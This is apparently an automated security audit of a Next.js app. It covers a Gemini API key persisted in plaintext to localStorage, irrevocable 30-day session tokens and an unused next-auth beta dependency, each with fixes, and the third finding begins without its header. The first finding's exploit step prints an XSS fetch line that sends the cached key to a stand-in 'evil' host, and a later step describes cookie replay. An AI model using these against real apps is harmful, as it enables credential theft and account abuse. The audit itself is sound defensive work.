## [HIGH] Decrypted Gemini API key is persisted in cleartext to browser localStorage via the React-Query cache
dim=secrets cwe=CWE-922 exploitable=True verifierConf=high
WHAT: The Gemini API key is encrypted at rest in Postgres (AES-256-GCM), but getSettings() decrypts it and returns it to the browser, where the whole React-Query cache — including the settings query that contains the plaintext key — is serialized verbatim into localStorage under 'avni-query-cache'. The key therefore sits in cleartext, persistently, on the client device, completely defeating the at-rest encryption.
HOW: PrismaDataStore.getSettings() (prismaDataStore.ts:336-365) decrypts geminiApiKeyCiphertext and returns { geminiApiKey: <plaintext>, ... }. /api/data (data/route.ts:77) ships that object to the client. useSettings() (queries.ts:45-47) stores it in the React-Query cache under qk.settings. Providers.tsx persists the cache by calling dehydrate(queryClient) with NO shouldDehydrateQuery filter (Providers.tsx:65-70) and writing the result to window.localStorage (PERSIST_KEY='avni-query-cache'). dehydrate() includes every successful query — so the settings query's data, with the plaintext key, is written to localStorage and retained for up to ONE_DAY (Providers.tsx:9,47). The author was aware of the persistence risk for the key in useGeminiModels (queries.ts:80-85 deliberately keys off only length+last-4 to avoid persisting it) but the settings query body still carries the full key into the same persisted blob, defeating that precaution.
EXPLOIT: 1. Victim saves their Gemini key in Settings; it is encrypted in the DB but also returned plaintext and cached. 2. Any actor with read access to the device's localStorage obtains it: a single XSS payload anywhere in the app can exfiltrate it with `fetch('https://evil/?k='+localStorage.getItem('avni-query-cache'))`; a shared/kiosk/stolen device exposes it via DevTools > Application > Local Storage; malware or a browser extension with storage access reads it. 3. The stolen key is a fully-usable Google Generative Language credential — the attacker bills Gemini usage to the victim's account and can exhaust quota or run their own workloads. The key survives logout only until clearAllCache runs, but is written back on any authenticated page load before that.
FIX: The claim's remediation is correct and sufficient. Two layers, best applied together:

1. Don't send the plaintext key to the client at all. In prismaDataStore.ts:354-364 stop returning geminiApiKey; return instead a non-sensitive shape: { hasGeminiKey: !!geminiApiKey, geminiKeyMasked: geminiApiKey ? maskSecret(geminiApiKey) : null } (maskSecret already exists, crypto.ts:59). Server-side consumers that need the real key (jobs/route.ts:78,92) read it directly from settings server-side and are unaffected. Client consumers (settings/page.tsx:40, record/page.tsx:105, page.tsx:141) switch to the boolean/mask. The Settings input would then be a write-only field ('enter a new key to replace').

2. Defense-in-depth on the cache: in Providers.tsx:68 pass a filter so the settings query is never persisted: dehydrate(queryClient, { shouldDehydrateQuery: q => defaultShouldDehydrateQuery(q) && q.queryKey[0] !== 'settings' }) (import defaultShouldDehydrateQuery from @tanstack/react-query). Independently, set gcTime:0/staleTime:0 on useSettings (queries.ts:45-47) so it is never serialized to localStorage even if the dehydrate filter regresses.

Both should be done; (1) is the real fix (the key should never leave the server in plaintext), (2) protects the cache regardless of what server changes land.

## [MEDIUM] 30-day stateless session token has no server-side revocation, rotation, or invalidation — logout and password change cannot kill an active/stolen session
dim=authn cwe=CWE-613 exploitable=False verifierConf=high
WHAT: Sessions are fully stateless: a signed token containing only {uid, exp} is the entire session. There is no server-side session record, no token version/jti, and nothing the server can check to invalidate a token before its 30-day exp. The DB stores no session state at all.
HOW: createSessionToken(userId) builds payload = base64url(JSON({uid, exp: now+30d})) and appends an HMAC-SHA256 signature. verifySessionToken only re-derives the HMAC, checks it matches, and checks exp > now. Because validity is a pure function of (secret, payload), any captured token remains valid for the full 30 days regardless of what the user does. logout/route.ts merely overwrites the cookie on the caller's own browser (maxAge:0) — it does not and cannot revoke the token value itself. There is no password-change flow that bumps a token version, so even rotating a password would not invalidate outstanding tokens.
EXPLOIT: 1. Attacker obtains a valid token once (e.g. via the http-downgrade issue below, a shared/public machine where the user only closed the tab, an XSS-adjacent log, a proxy, or a backup). 2. Attacker replays the cookie value `avni_session=<token>` against /api/data or /api/auth/me. 3. The victim clicks 'log out' (or changes password). 4. The attacker's copy of the token still authenticates for up to 30 days because logout only cleared the victim's cookie and nothing server-side was invalidated. There is no way for the user or admin to terminate the stolen session short of rotating AUTH_SECRET, which logs out every user.
FIX: Introduce a server-checkable invalidation signal. Minimal, lowest-churn fix: add `sessionsValidFrom DateTime @default(now())` (or `tokenVersion Int @default(0)`) to the User model; include the user's current value (and an `iat`) inside the signed payload in createSessionToken; in verifySessionToken, after the HMAC check, load the user and reject when payload.iat < user.sessionsValidFrom (or payload.version != user.tokenVersion). Bump sessionsValidFrom/tokenVersion on a real logout ("log out everywhere") and on any future password change. Note this adds one DB read per authenticated request — acceptable here since every request already hits Prisma. For first-class per-device revocation, instead persist Session rows (id/jti, userId, expiresAt, revokedAt) and validate a jti in the payload against that table on each request, deleting/flagging the row on logout. Also consider shortening the 30-day absolute lifetime and adding rolling/idle expiry. Since the realistic capture vector named in the report is HTTP downgrade, also ensure the session cookie is only ever issued over HTTPS in production and consider __Host- prefixing.

A NextAuth catch-all at /api/auth/[...nextauth] is a dynamic segment; Next.js App Router prefers a static/explicit segment over a dynamic one at the same level, so the existing fixed routes would still win for those exact paths — but ANY new sub-path under /api/auth (and the auth() middleware, which runs BEFORE route handlers) would be owned by NextAuth, creating two session systems on the same origin. (2) SECRET REUSE / COOKIE CONFUSION: the custom session signs tokens with process.env.AUTH_SECRET (session.ts:10-11) — which is the EXACT env var NextAuth v5 reads by default for its own JWT signing/encryption. If NextAuth is ever instantiated it will silently adopt the same AUTH_SECRET and derive JWE keys from it, so one secret would protect two unrelated token formats; the custom cookie is named `avni_session` (session.ts:6) while NextAuth defaults to `authjs.session-token`, so they won't overwrite each other, but a developer/AI 'fixing auth' would see AUTH_SECRET already configured and assume NextAuth is the intended system. (3) INTENT MISMATCH RAISES THE ODDS: the approved design spec at docs/superpowers/specs/2026-06-09-ai-food-health-tracker-design.md:19 explicitly locks auth as 'Auth.js (next-auth v5), Credentials provider, JWT sessions' — i.e. the documented intended architecture is NextAuth, but the implementation silently diverged to a custom HMAC cookie while leaving the dep installed. A maintainer or AI assistant reconciling code-to-spec is therefore actively invited to wire up the very framework that would shadow/duplicate the real auth. (4) SUPPLY CHAIN: a 5.0.0-beta is precisely the release line where auth-bypass advisories land (Auth.js/next-auth v5 betas have a history of session/redirect/CSRF advisories), and the caret `^5.0.0-beta.31` will float forward to later betas on a fresh `npm install`, shipping whatever beta is current into the Vercel production bundle even though it is never called.
EXPLOIT: There is no direct one-shot exploit against the running app today because the framework is never invoked — hence LOW severity. The realistic attack path is a future-state / second-order one: (1) A maintainer or an AI coding assistant is asked to 'make auth match the spec' or 'add OAuth/Google login'; seeing next-auth already in package.json, AUTH_SECRET already set, and the spec naming Auth.js, they create src/app/api/auth/[...nextauth]/route.ts and a root middleware.ts calling auth(). (2) The middleware now runs on every request ahead of the route handlers; misconfigured matcher or a beta redirect/session bug (the class of CVE common in auth betas) yields an auth bypass, OR the two cookie systems (`avni_session` vs `authjs.session-token`) diverge so that logout via one path leaves the other valid — a session-fixation / incomplete-logout condition. (3) Separately, an attacker scanning the production bundle/headers can fingerprint next-auth's presence and target a published beta advisory for whatever 5.0.0-beta the caret resolved to, even before it is wired, to guide further probing. (4) `npm install` on a CI/teammate machine silently upgrades to a newer, possibly-vulnerable beta.
FIX: Recommended as good hygiene, not as a security fix: (1) Run `npm uninstall next-auth` to drop the unused dep (and transitive @auth/core), remove line 26 of package.json, and commit the updated lockfile. (2) Add a no-restricted-imports ESLint guard for next-auth/@auth/* in eslint.config.mjs to prevent accidental reintroduction. (3) Update docs/superpowers/specs/2026-06-09-ai-food-health-tracker-design.md:19 to document that auth is a custom HMAC-SHA256 signed-cookie session, not Auth.js, so the spec stops inviting a NextAuth wire-up. (4) Optionally document in session.ts that the AUTH_SECRET name is incidental, not a NextAuth handoff. These are dependency-hygiene and documentation improvements; they close a latent maintenance/footgun risk, not an active exploit.
